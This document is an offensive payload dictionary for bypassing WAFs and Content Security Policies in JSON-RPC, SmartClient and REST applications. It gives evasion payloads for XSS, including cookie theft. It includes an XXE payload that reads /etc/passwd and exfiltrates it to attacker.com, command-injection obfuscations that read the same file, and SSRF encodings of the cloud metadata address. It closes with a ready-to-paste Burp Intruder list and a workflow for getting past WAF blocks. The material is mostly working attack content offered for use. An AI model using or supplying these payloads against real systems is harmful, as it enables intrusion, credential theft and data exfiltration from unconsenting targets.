# Advanced RPC Payload Dictionary: WAF & CSP Bypass
**Target Environment**: Modern RPC Architectures (JSON-RPC, SmartClient/Isomorphic, REST)
**Update Level**: 2024-2025 Evasion Techniques

This dictionary provides high-fidelity, "Advanced" payloads designed to bypass signature-based WAFs and restrictive Content Security Policies (CSP).

---

## 1. Advanced XSS (Bypassing CSP & WAF)

WAFs often block `<script>` or `on*` attributes. CSP blocks inline scripts. These payloads use **Script Gadgets** and **Obfuscation**.

### A. Unicode Escaped Payload (WAF Bypass)
*   **Why it works**: Valid in JSON/RPC. The WAF regex sees a harmless string; the backend JS engine decodes it into a script.
*   **Payload**: `\u003cscript\u003ealert(1)\u003c/script\u003e`
*   **RPC Location**: Any JSON string value.

### B. SmartClient / Isomorphic Script Gadget (CSP Bypass)
*   **Why it works**: Leverages existing framework code (Gadget) to execute scripts, circumventing 'self' policies.
*   **Payload**: `"');alert(document.cookie);//` (Injecting into a framework-controlled string parameter).

### C. SVG-Based Filter Bypass
*   **Why it works**: SVGs use different parsing rules than HTML, often bypassing standard XSS filters.
*   **Payload**: `<svg/onload=eval(atob('YWxlcnQoMSk='))>`

---

## 2. Advanced XXE (Out-of-Band & Bypassing Inspection)

Standard XXE is often blocked. These variants use **Parameter Entities** to hide the "System" call from WAF inspection.

### A. OOB Entity Nesting (Exfiltration)
*   **Why it works**: The primary entity only calls a secondary entity, which performs the exfiltration.
*   **Payload (XML Body)**:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
      %eval;
      %exfiltrate;
    ]>
    <ebicsRequest>...</ebicsRequest>
    ```

### B. Local DTD Hijacking (Air-Gapped Bypass)
*   **Why it works**: Bypasses firewalls that block outbound OOB callbacks by reusing an existing DTD file on the server.
*   **Payload**:
    ```xml
    <!DOCTYPE foo [
      <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
      %local_dtd;
    ]>
    ```

---

## 3. Advanced Command Injection (WAF Evasion)

WAFs block `cat /etc/passwd` or `ls`. Use **Variable Expansion** and **Internal Field Separators**.

### A. Space-less Obfuscation
*   **Why it works**: Uses `${IFS}` (Linux) or `$IFS$9` to bypass space-based keyword detection.
*   **Payload**: `cat${IFS}/etc/passwd`

### B. Keyword Reconstruction (Linux)
*   **Why it works**: Reconstructs the command at runtime using variable slicing.
*   **Payload**: `a=ca;b=t;c=/etc/pa;d=sswd;$a$b${IFS}$c$d`

### C. Backslash Escaping
*   **Why it works**: Linux treats `\c\a\t` the same as `cat`, but WAF regexes often fail to match the sequence.
*   **Payload**: `\c\a\t\ \/\e\t\c\/\p\a\s\s\w\d`

---

## 4. Advanced SSRF (Cloud & Internal Bypass)

Focuses on bypassing "Blocklists" of internal IPs like `169.254.169.254`.

### A. Decimal Conversion
*   **Why it works**: Browsers and HTTP libraries often resolve decimal IPs, while WAFs only check the dotted-quad string.
*   **Payload**: `http://2852039166` (Decimal for 169.254.169.254).

### B. Octal Representation
*   **Why it works**: Similar to decimal, many libraries interpret leading-zero segments as octal.
*   **Payload**: `http://0251.0376.0251.0376`

---

## 5. Consolidated Burp Intruder Payload List (Raw)

Copy the following into your Intruder `Payload Options [Simple List]`:

```text
\u003cscript\u003ealert(1)\u003c/script\u003e
<svg/onload=eval(atob('YWxlcnQoMSk='))>
\u0027 OR 1=1 --
'/**/OR/**/1=1/**/--
cat${IFS}/etc/passwd
\c\a\t\ \/\e\t\c\/\p\a\s\s\w\d
$(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
http://2852039166
http://0251.0376.0251.0376
"');alert(1);//
%0a/usr/bin/id
`id`
{{7*7}}
${7*7}
[#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Security','Vulnerable')]
```

---

## 6. Probing Strategy for "400 Error" Bypasses

When the server returns a **400 Bad Request**, the WAF has identified a "Bad Character". Use this workflow to isolate the trigger:

1.  **Isolate Keywords**: Send `id`, `whoami`, `cat` individually. If `cat` is blocked but `id` is not, use the Keyword Reconstruction (Section 3B).
2.  **Isolate Symbols**: Send `<`, `(`, `'`. If `<` is blocked, switch to Unicode encoding (`\u003c`) or SVG payloads.
3.  **Detect Padding Limits**: Some WAFs stop inspecting after N bytes. Prepend `{"junk": "A" * 8192}` to your JSON request to determine if the inspection window can be exceeded.
